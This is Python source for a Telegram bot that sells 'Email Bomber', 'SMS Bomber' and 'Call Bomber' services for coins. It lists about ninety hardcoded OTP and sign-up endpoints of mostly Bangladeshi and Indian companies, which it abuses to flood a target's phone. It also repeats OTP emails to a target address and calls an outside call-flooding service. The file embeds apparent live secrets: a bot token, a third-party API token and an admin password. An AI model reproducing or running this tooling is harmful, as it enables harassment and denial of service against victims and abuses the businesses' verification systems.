import json
import os
import random
import requests
import asyncio
from urllib.parse import quote

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    helpers
)

from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters
)

# --- CONFIGURATION ---
BOT_TOKEN = "9040406094:AAF7B0sChyY6GvjDajpL-9RrCCDD_j06Hx0"

OWNER_ID = 8177748927
ADMIN_ID = 7552525279
LOG_CHANNEL = "-1003373817473"

DB_FILE = "email_bomber.json"

active_bomb_flags = {}

GET_EMAIL, GET_LIMIT = 1, 2
SMS_PHONE, SMS_LIMIT = 3, 4
CALL_PHONE, CALL_LIMIT = 31, 32
(
    BROADCAST_MEDIA, BROADCAST_BTN_CHOICE, BROADCAST_BTN_NAME, 
    BROADCAST_BTN_URL, BROADCAST_BTN_STYLE, BROADCAST_PREVIEW,
    ADD_COIN_STATE, CUT_COIN_STATE, SEARCH_USER_STATE, MAINT_MSG_STATE,
    BAN_STATE, UNBAN_STATE, ADD_CHANNEL_STATE, REMOVE_CHANNEL_STATE, 
    SET_REF_BONUS_STATE, CREATE_CODE_CODE, CREATE_CODE_LIMIT, 
    CREATE_CODE_COIN, REDEEM_CODE_STATE, SINGLE_BC_USER_STATE, SINGLE_BC_MSG_STATE
) = range(10, 31)

def to_bold_sans(text: str) -> str:
    if not isinstance(text, str):
        return text
    normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    bold_upper = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
    
    normal_lower = "abcdefghijklmnopqrstuvwxyz"
    bold_lower = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
    
    normal_digits = "0123456789"
    bold_digits = "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
    
    trans_table = str.maketrans(
        normal_upper + normal_lower + normal_digits,
        bold_upper + bold_lower + bold_digits
    )
    return text.translate(trans_table)

SMS_APIS = [
    {"url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "data_func": lambda p: {"phone": p, "city": 362}},
    {"url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "data_func": lambda p: {"phone": p, "email": "test@example.com"}},
    {"url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "data_func": lambda p: {"phoneNumber": p, "channel": "SMS"}},
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data_func": lambda p: {"phone": p, "country_url_name": "in"}},
    {"url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "data_func": lambda p: {"phone": p, "app_signature": "wk+avHrHZf2"}},
    {"url": "https://animall.in/zap/auth/login", "method": "POST", "data_func": lambda p: {"phone": p, "signupPlatform": "NATIVE_ANDROID"}},
    {"url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "data_func": lambda p: {"phone": p, "version": "1.4.28"}},
    {"url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "data_func": lambda p: {"mobile": p}},
    {"url": lambda p: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={p}", "method": "GET", "data_func": None},
    {"url": lambda p: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{p}&lang=en&ng=0", "method": "GET", "data_func": None},
    {"url": lambda p: f"https://auth.shukhee.com/register?mobile=+88{p}&_rsc=1jwvn", "method": "GET", "data_func": None},
    {"url": lambda p: f"https://api.medeasy.health/api/send-otp/+88{p}/", "method": "GET", "data_func": None},
    {"url": lambda p: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={p}", "method": "GET", "data_func": None},
    {"url": lambda p: f"https://ss.binge.buzz/otp/send/login{p}", "method": "GET", "data_func": None},
    {"url": "https://app.deshal.net/api/auth/login", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "data_func": lambda p: {"msisdn": p}},
    {"url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "method": "POST", "data_func": lambda p: {"phone": p, "email": "", "language": "en"}},
    {"url": "https://api.busbd.com.bd/api/auth", "method": "POST", "data_func": lambda p: {"phone": f"+88{p}"}},
    {"url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "method": "POST", "data_func": lambda p: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": p}},
    {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "POST", "data_func": lambda p: {"mobile": f"+880{p}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"url": "https://api.apex4u.com/api/auth/login", "method": "POST", "data_func": lambda p: {"phoneNumber": p}},
    {"url": "https://bb-api.bohubrihi.com/public/activity/otp", "method": "POST", "data_func": lambda p: {"phone": p, "intent": "login"}},
    {"url": "https://fundesh.com.bd/api/auth/generateOTP", "method": "POST", "data_func": lambda p: {"msisdn": p}},
    {"url": f"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method": "POST", "data_func": lambda p: {"mobile": f"+88{p}"}},
    {"url": f"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method": "POST", "data_func": lambda p: {"mobile": f"+88{p}"}},
    {"url": f"https://auth.qcoom.com/api/v1/otp/send", "method": "POST", "data_func": lambda p: {"mobileNumber": f"+88{p}"}},
    {"url": "https://api.garibookadmin.com/api/v4/user/login", "method": "POST", "data_func": lambda p: {"mobile": f"+880{p}", "recaptcha_token": "garibookcaptcha", "channel": "web"}},
    {"url": "https://training.gov.bd/backoffice/api/user/sendOtp", "method": "POST", "data_func": lambda p: {"mobile": p}},
    {"url": "https://api.shikho.com/public/activity/otp", "method": "POST", "data_func": lambda p: {"phone": p, "intent": "ap-discount-request"}},
    {"url": "https://core.easy.com.bd/api/v1/registration", "method": "POST", "data_func": lambda p: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": p, "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."}},
    {"url": "https://da-api.robi.com.bd/da-nll/otp/send", "method": "POST", "data_func": lambda p: {"msisdn": p}},
    {"url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "method": "POST", "data_func": lambda p: {"phoneNumber": p, "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"url": "https://app.addatimes.com/api/login", "method": "POST", "data_func": lambda p: {"phone": p, "country_code": "BD"}},
    {"url": "https://regalfurniturebd.com/api/auth/otp-generate", "method": "POST", "data_func": lambda p: {"phone": p, "verification_code": ""}},
    {"url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data_func": lambda p: {"email": "apkzone2.0@gmail.com", "phone_number": f"88{p}"}},
    {"url": "https://backend.timezonebd.com/api/v1/user/otp-request", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data_func": lambda p: {"number": f"+880{p}"}},
    {"url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", "method": "POST", "data_func": lambda p: f"mobile={p}&fcmToken=&referral="},
    {"url": "https://www.pkluck2.com/wps/verification/sms/noLogin", "method": "POST", "data_func": lambda p: {"mobileNum": p, "countryDialingCode": "880"}},
    {"url": "https://applink.com.bd/appstore-v4-server/login/otp/request", "method": "POST", "data_func": lambda p: {"msisdn": f"880{p}"}},
    {"url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "method": "POST", "data_func": lambda p: {"mobile_no": p}},
    {"url": "https://api.swap.com.bd/api/v1/send-otp/v2", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "method": "POST", "data_func": lambda p: {"phone": f"+880{p}"}},
    {"url": "https://ss.binge.buzz/otp/send/login", "method": "POST", "data_func": lambda p: {"mobile": p}},
    {"url": "https://app.eonbazar.com/api/auth/login", "method": "POST", "data_func": lambda p: {"method": "otp", "mobile": p}},
    {"url": "http://nesco.sslwireless.com/api/v1/login", "method": "POST", "data_func": lambda p: {"phone_number": p}},
    {"url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "method": "POST", "data_func": lambda p: {"country_code": "+880", "phone": p}},
    {"url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", "method": "POST", "data_func": lambda p: {"phone": p, "applicationChannel": "WEB_APP"}},
    {"url": lambda p: f"https://apu-inky.vercel.app/send?number={p}", "method": "GET", "data_func": None},
    {"url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "data_func": lambda p: {"mobileNo": p, "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}},
    {"url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "data_func": lambda p: {"phone_number": p, "language": "en"}},
    {"url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "data_func": lambda p: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": p}},
    {"url": "https://shombhob.com/api/otp-login", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://accountkit.sheba.xyz/api/shoot-otp", "method": "POST", "data_func": lambda p: {"mobile": f"+88{p}", "app_id": "8329815A6D1AE6DD", "api_token": "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}},
    {"url": "https://epharma.com.bd/authentication/send-otp", "method": "POST", "data_func": lambda p: f"number=%2B88{p}"},
    {"url": "https://api.apex4u.com/api/auth/login", "method": "POST", "data_func": lambda p: {"phoneNumber": p}},
    {"url": "https://www.othoba.com/register", "method": "POST", "data_func": lambda p: f"phone={p}"},
    {"url": "https://apcombd.com/register", "method": "POST", "data_func": lambda p: f"phone={p}"},
    {"url": "https://webapi.robi.com.bd/v1/account/register/otp", "method": "POST", "data_func": lambda p: {"phone_number": p}},
    {"url": "https://web-api.binge.buzz/api/v3/otp/send/", "method": "GET", "data_func": None},
    {"url": "https://mapi.toffeelive.com/re-registration-v2", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.garibookadmin.com/api/v2/user/login", "method": "POST", "data_func": lambda p: {"mobile": p}},
    {"url": "https://developer.medha.info/api/send-otp", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://shopapp.self-shopping.com/public/webpost?random=461722&webpost=1", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.healthplus.life/api/v6/otp-new", "method": "POST", "data_func": lambda p: {"msisdn": p}},
    {"url": "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.10minuteschool.com/auth/v1/userExists", "method": "POST", "data_func": lambda p: {"username": p}},
    {"url": "https://aapathshala.com/registration/?action=sendotp", "method": "POST", "data_func": lambda p: f"contact_no={p}"},
    {"url": "https://tethys.trucklagbe.com/tl_gateway/tl_login/120/checkUserStatus", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://www.aarong.com/customer/account/createpost/", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://otithee.com/generate-otp", "method": "POST", "data_func": lambda p: f"phone={p}"},
    {"url": "https://steadfast.com.bd/register", "method": "POST", "data_func": lambda p: f"mobile={p}"},
    {"url": "https://www.deliverynowbd.com/merchant-registration", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.foodibd.com/users/api/Authentication/Customer/Register", "method": "POST", "data_func": lambda p: {"mobileNumber": p}},
    {"url": "https://api-gateway.sundarbancourierltd.com/graphql", "method": "POST", "data_func": lambda p: {"username": p}},
    {"url": "https://api-v2.gadgetandgear.com/api/v1/auth/customer/send-otp", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://services.nidw.gov.bd/nid-pub/claim-account/send-sms", "method": "POST", "data_func": lambda p: f"mobile={p}"},
    {"url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://account.bkash.com/personal-retail-account/gateway/api/public/otp/send", "method": "POST", "data_func": lambda p: {"phoneNumber": p}},
    {"url": "https://www.niloymotors.com/NiloyHeroAppService/api/niloy-hero/mobile-app/send-sms-with-otp?toMobileNumber=", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.pathao.com/v2/auth/register", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://payment.portpos.com/v2/api/user/signup-otp", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://reseller.circle.com.bd/api/v2/auth/signup", "method": "POST", "data_func": lambda p: {"phone": f"+88{p}"}},
    {"url": "https://rootsedulive.com/api/auth/register", "method": "POST", "data_func": lambda p: f"phone={p}"},
    {"url": "https://rtvplus.tv/signin/signupsubmit", "method": "POST", "data_func": lambda p: f"phone={p}"},
    {"url": "https://shop.shajgoj.com/wp-json/sg/v2/phone-login", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://prod.saralifestyle.com/api/Master/SendToken", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://api.zaynaxhealth.com/auth_service/auth/register/phone/user", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://www.shwapno.com/api/auth", "method": "POST", "data_func": lambda p: {"phoneNumber": f"+88{p}"}},
    {"url": "https://fabrilife.com/sendOTP", "method": "POST", "data_func": lambda p: f"phone={p}"},
    {"url": "https://api.ilyn.global/auth/signup", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://app.hishabee.business/api/V2/otp/send?mobile_number=", "method": "POST", "data_func": lambda p: {"phone": p}},
    {"url": "https://www.thebodyshop.com.bd/smspro/customer/register/", "method": "POST", "data_func": lambda p: f"mobile=88{p}"},
    {"url": "https://web.tallykhata.com/api/auth/init", "method": "POST", "data_func": lambda p: {"mobile": p}}
]

def load_db():
    if not os.path.exists(DB_FILE):
        default_data = {
            "users": {},
            "daily_bonus": {},
            "admin_usage": {str(ADMIN_ID): 0, str(OWNER_ID): 0},
            "banned_users": [],
            "force_channels": ["@mr_abutaher"],
            "refer_bonus": 1,
            "redeem_codes": {},
            "maintenance_mode": False,
            "maintenance_message": to_bold_sans("⚠️ Bot is currently under maintenance. Please try again later.")
        }
        save_db(default_data)
        return default_data
    try:
        with open(DB_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "banned_users" not in data: data["banned_users"] = []
            if "force_channels" not in data: data["force_channels"] = ["@mr_abutaher"]
            if "users" not in data: data["users"] = {}
            if "refer_bonus" not in data: data["refer_bonus"] = 1
            if "redeem_codes" not in data: data["redeem_codes"] = {}
            if "maintenance_mode" not in data: data["maintenance_mode"] = False
            if "maintenance_message" not in data: data["maintenance_message"] = to_bold_sans("⚠️ Bot is currently under maintenance. Please try again later.")
            return data
    except Exception:
        return {
            "users": {}, "daily_bonus": {}, "admin_usage": {}, "banned_users": [], 
            "force_channels": ["@mr_abutaher"], "refer_bonus": 1, "redeem_codes": {},
            "maintenance_mode": False, "maintenance_message": to_bold_sans("⚠️ Bot is currently under maintenance. Please try again later.")
        }

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def send_cosmotown_otp(email: str):
    url = "https://portal.cosmotown.com/api/v1/send-otp"
    payload = {"email": email}
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://portal.cosmotown.com",
        "Referer": "https://portal.cosmotown.com/",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code, response.text
    except Exception as e:
        return 500, str(e)

def send_sms_request(phone: str, api_config):
    try:
        url = api_config["url"]
        if callable(url):
            url = url(phone)
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        if api_config["method"] == "POST":
            data = api_config["data_func"](phone) if api_config["data_func"] else None
            if isinstance(data, str):
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                res = requests.post(url, data=data, headers=headers, timeout=5)
            else:
                res = requests.post(url, json=data, headers=headers, timeout=5)
        else:
            res = requests.get(url, headers=headers, timeout=5)
        return res.status_code, res.text
    except Exception as e:
        return 500, str(e)

def send_call_request(phone: str, count: int):
    url = f"https://techmster.site/xcz/Call/rocket.php?phone={phone}&count={count}&delay=10"
    try:
        res = requests.get(url, timeout=30)
        return res.status_code, res.text
    except Exception as e:
        return 500, str(e)

async def send_log_to_channel(bot, log_text):
    if not LOG_CHANNEL:
        return
    try:
        chat_target = int(LOG_CHANNEL) if (LOG_CHANNEL.startswith("-") or LOG_CHANNEL.isdigit()) else LOG_CHANNEL
        await bot.send_message(chat_id=chat_target, text=to_bold_sans(log_text))
    except Exception as e:
        print(f"Failed to send log to channel: {e}")

async def check_force_sub(bot, user_id):
    db = load_db()
    channels = db.get("force_channels", [])
    if not channels:
        return True
    for channel in channels:
        try:
            chat_target = int(channel) if (channel.startswith("-") or channel.isdigit()) else channel
            member = await bot.get_chat_member(chat_id=chat_target, user_id=user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception:
            pass
    return True

async def get_channel_link(bot, ch):
    ch = ch.strip()
    if ch.startswith("https://t.me/"):
        return ch
    elif ch.startswith("-") or ch.isdigit():
        try:
            chat_id = int(ch)
            link = await bot.export_chat_invite_link(chat_id)
            return link
        except Exception:
            return "https://t.me/"
    else:
        ch_clean = ch.replace("@", "")
        return f"https://t.me/{ch_clean}"

def get_user_keyboard():
    return ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(to_bold_sans("💣 Email Bomber"), style="danger"),
                KeyboardButton(to_bold_sans("💣 SMS Bomber"), style="danger"),
            ],
            [
                KeyboardButton(to_bold_sans("💣 Call Bomber"), style="danger"),
            ],
            [
                KeyboardButton(to_bold_sans("🎁 Daily Bonus"), style="success"),
                KeyboardButton(to_bold_sans("👤 MY PROFILE"), style="primary"),
            ],
            [
                KeyboardButton(to_bold_sans("🔗 Referral Link"), style="primary"),
                KeyboardButton(to_bold_sans("🎟️ Redeem Code"), style="success"),
            ],
            [
                KeyboardButton(to_bold_sans("💰 BUY COIN"), style="success"),
                KeyboardButton(to_bold_sans("🏆 LEADERBOARD"), style="primary"),
            ],
        ],
        resize_keyboard=True,
        input_field_placeholder=to_bold_sans("Choose an option below..."),
        is_persistent=True,
    )

def get_admin_keyboard(ref_bonus_val, maint_status=False):
    maint_text = "🟢 Maintenance: ON" if maint_status else "🔴 Maintenance: OFF"
    return ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(to_bold_sans("📢 Broadcast"), style="primary"),
                KeyboardButton(to_bold_sans("🎟️ Create Code"), style="success"),
            ],
            [
                KeyboardButton(to_bold_sans("➕ Add Balance"), style="success"),
                KeyboardButton(to_bold_sans("➖ Cut Balance"), style="danger"),
            ],
            [
                KeyboardButton(to_bold_sans("🔍 Search User"), style="primary"),
                KeyboardButton(to_bold_sans(maint_text), style="primary"),
            ],
            [
                KeyboardButton(to_bold_sans("🚫 Ban User"), style="danger"),
                KeyboardButton(to_bold_sans("✅ Unban User"), style="success"),
            ],
            [
                KeyboardButton(to_bold_sans("➕ Add Force Channel"), style="success"),
                KeyboardButton(to_bold_sans("➖ Remove Force Channel"), style="danger"),
            ],
            [
                KeyboardButton(to_bold_sans("📋 Force Channels List"), style="primary"),
                KeyboardButton(to_bold_sans(f"⚙️ Set Refer Bonus ({ref_bonus_val})"), style="primary"),
            ],
            [
                KeyboardButton(to_bold_sans("❌ Cancel"), style="danger"),
            ],
        ],
        resize_keyboard=True,
        input_field_placeholder=to_bold_sans("Admin panel options..."),
        is_persistent=True,
    )

async def secret_db_download_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and user_id != ADMIN_ID:
        return
    
    args = context.args
    entered_password = " ".join(args) if args else ""
    
    if entered_password == "Mr Abu Taher":
        if os.path.exists(DB_FILE):
            try:
                with open(DB_FILE, "rb") as f:
                    await update.message.reply_document(
                        document=f,
                        filename="email_bomber.json",
                        caption=to_bold_sans("🔐 Secure Database Backup File Downloaded Successfully.")
                    )
            except Exception as e:
                await update.message.reply_text(to_bold_sans(f"❌ Error sending database file: {str(e)}"))
        else:
            await update.message.reply_text(to_bold_sans("❌ Database file not found!"))
    else:
        pass

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_id_str = str(user_id)
    
    db = load_db()

    if db.get("maintenance_mode", False) and user_id != OWNER_ID and user_id != ADMIN_ID:
        maint_msg = db.get("maintenance_message", to_bold_sans("⚠️ Bot is currently under maintenance. Please try again later."))
        await update.message.reply_text(maint_msg)
        return

    if user_id in db.get("banned_users", []):
        await update.message.reply_text(to_bold_sans("❌ You are banned from using this bot!"))
        return

    args = context.args
    joined_date_str = update.message.date.strftime("%Y-%m-%d %H:%M:%S") if update.message and update.message.date else "Unknown"

    if user_id_str not in db["users"]:
        db["users"][user_id_str] = {
            "balance": 0, 
            "username": user.username or "None", 
            "first_name": user.first_name or "User",
            "referred_by": None,
            "reg_info": joined_date_str
        }
        
        if args and args[0].isdigit():
            ref_id = args[0]
            if ref_id in db["users"] and ref_id != user_id_str:
                db["users"][user_id_str]["referred_by"] = ref_id
                bonus = db.get("refer_bonus", 1)
                db["users"][ref_id]["balance"] += bonus
                
                total_refs = sum(1 for u in db["users"].values() if u.get("referred_by") == ref_id)
                try:
                    await context.bot.send_message(
                        chat_id=int(ref_id),
                        text=to_bold_sans(
                            "🎉 NEW REFERRAL SUCCESSFUL!\n\n"
                            f"Someone Joined Using Your Referral Link.\n"
                            f"Your Total Referrals: {total_refs}\n"
                            "Keep Inviting More Friends!"
                        )
                    )
                except:
                    pass
        save_db(db)
    else:
        db["users"][user_id_str]["username"] = user.username or "None"
        db["users"][user_id_str]["first_name"] = user.first_name or "User"
        if "reg_info" not in db["users"][user_id_str]:
            db["users"][user_id_str]["reg_info"] = joined_date_str
        save_db(db)

    is_subscribed = await check_force_sub(context.bot, user_id)
    if not is_subscribed:
        channels = db.get("force_channels", [])
        keyboard_buttons = []
        for ch in channels:
            link = await get_channel_link(context.bot, ch)
            keyboard_buttons.append([InlineKeyboardButton(to_bold_sans("📢 Join Channel / Group"), url=link, style="primary")])

        keyboard_buttons.append([InlineKeyboardButton(to_bold_sans("🔄 Verify Joined"), callback_data="verify_sub", style="success")])
        keyboard = InlineKeyboardMarkup(keyboard_buttons)

        await update.message.reply_text(
            to_bold_sans("⚠️ You must join our update channel/group to use this bot!\n\nPlease join below and click 'Verify Joined':"),
            reply_markup=keyboard
        )
        return

    keyboard = get_user_keyboard()
    await update.message.reply_text(
        to_bold_sans("🔄 Bot restarted\n👋 Welcome! Please choose an option from the keyboard below:"),
        reply_markup=keyboard
    )

async def stop_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id_str = str(update.effective_user.id)
    active_bomb_flags[user_id_str] = False
    keyboard = get_user_keyboard()
    await update.message.reply_text(
        to_bold_sans("🛑 Cancelled!\n\nYour ongoing task has been successfully stopped."),
        reply_markup=keyboard
    )

async def verify_sub_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    is_subscribed = await check_force_sub(context.bot, user_id)
    if not is_subscribed:
        await query.answer(to_bold_sans("❌ You haven't joined the required channel yet!"), show_alert=True)
        return

    try:
        await query.message.delete()
    except:
        pass

    keyboard = get_user_keyboard()
    await query.message.reply_text(
        to_bold_sans("✅ Verification Successful! Welcome back.\nPlease choose an option from the keyboard below:"),
        reply_markup=keyboard
    )

async def admin_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and user_id != ADMIN_ID:
        await update.message.reply_text(to_bold_sans("❌ You don't have permission to access the admin panel!"))
        return

    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    maint_status = db.get("maintenance_mode", False)
    keyboard = get_admin_keyboard(ref_bonus_val, maint_status)
    
    await update.message.reply_text(to_bold_sans("⚙️ Advanced Admin Panel\n\nChoose an option below:"), reply_markup=keyboard)

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db = load_db()
    
    if db.get("maintenance_mode", False) and user_id != OWNER_ID and user_id != ADMIN_ID:
        maint_msg = db.get("maintenance_message", to_bold_sans("⚠️ Bot is currently under maintenance. Please try again later."))
        await update.message.reply_text(maint_msg)
        return

    if user_id in db.get("banned_users", []):
        return

    text = update.message.text
    user_id_str = str(user_id)

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        active_bomb_flags[user_id_str] = False
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("🔄 Bot refreshed & Operation cancelled."), reply_markup=keyboard)
        return

    is_subscribed = await check_force_sub(context.bot, user_id)
    if not is_subscribed:
        channels = db.get("force_channels", [])
        keyboard_buttons = []
        for ch in channels:
            link = await get_channel_link(context.bot, ch)
            keyboard_buttons.append([InlineKeyboardButton(to_bold_sans("📢 Join Channel / Group"), url=link, style="primary")])
        keyboard_buttons.append([InlineKeyboardButton(to_bold_sans("🔄 Verify Joined"), callback_data="verify_sub", style="success")])
        
        keyboard = InlineKeyboardMarkup(keyboard_buttons)
        await update.message.reply_text(
            to_bold_sans("⚠️ You must join our update channel/group to use this bot!\n\nPlease join below and click 'Verify Joined':"),
            reply_markup=keyboard
        )
        return

    if text == to_bold_sans("💣 Email Bomber") or text == "💣 Email Bomber":
        current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
        if current_bal < 1:
            await update.message.reply_text(to_bold_sans("❌ You don't have enough balance! You need at least 1 coin to use Email Bomber."))
            return
        await update.message.reply_text(
            to_bold_sans("📧 Please enter the target email address you want to send OTP to:\n(Example: example@gmail.com)"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter target email here...")),
            parse_mode="Markdown"
        )
        return GET_EMAIL

    elif text == to_bold_sans("💣 SMS Bomber") or text == "💣 SMS Bomber":
        current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
        if current_bal < 1:
            await update.message.reply_text(to_bold_sans("❌ You don't have enough balance! You need at least 1 coin to use SMS Bomber."))
            return
        await update.message.reply_text(
            to_bold_sans("📱 Please enter the target mobile number (without +88, e.g., 017XXXXXXXX):"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter mobile number..."))
        )
        return SMS_PHONE

    elif text == to_bold_sans("💣 Call Bomber") or text == "💣 Call Bomber":
        current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
        if current_bal < 1:
            await update.message.reply_text(to_bold_sans("❌ You don't have enough balance! You need at least 1 coin to use Call Bomber."))
            return
        await update.message.reply_text(
            to_bold_sans("📞 Please enter the target mobile number for Call Bomber (e.g., 01930486479):"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter mobile number..."))
        )
        return CALL_PHONE

    elif text == to_bold_sans("🎁 Daily Bonus") or text == "🎁 Daily Bonus":
        import datetime
        today = datetime.date.today().isoformat()
        if db["daily_bonus"].get(user_id_str) == today:
            await update.message.reply_text(to_bold_sans("⚠️ You have already claimed your daily bonus today!"))
        else:
            db["daily_bonus"][user_id_str] = today
            current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
            db["users"][user_id_str]["balance"] = current_bal + 1
            save_db(db)
            await update.message.reply_text(to_bold_sans("🎉 Congratulations! You have successfully received +1 daily bonus!"))

    elif text == to_bold_sans("👤 MY PROFILE") or text == "👤 MY PROFILE":
        u_data = db["users"].get(user_id_str, {"balance": 0, "first_name": update.effective_user.first_name or "User"})
        name = to_bold_sans(u_data.get("first_name", "User"))
        balance = to_bold_sans(str(u_data.get("balance", 0)))
        username = to_bold_sans(f"@{update.effective_user.username}" if update.effective_user.username else "Not Set")
        total_referral = to_bold_sans(str(sum(1 for u in db["users"].values() if u.get("referred_by") == user_id_str)))
        joined_date = to_bold_sans(u_data.get("reg_info", "Unknown"))
        uid_str = to_bold_sans(str(user_id))

        profile_text = (
            f"╭─── 👤 𝐌𝐘 𝐏𝐑𝐎𝐅𝐈𝐋𝐄\n"
            f"│\n"
            f"├ 👤 𝐍𝐚𝐦𝐞: {name}\n"
            f"├ 🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: {uid_str}\n"
            f"├ 🔖 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}\n"
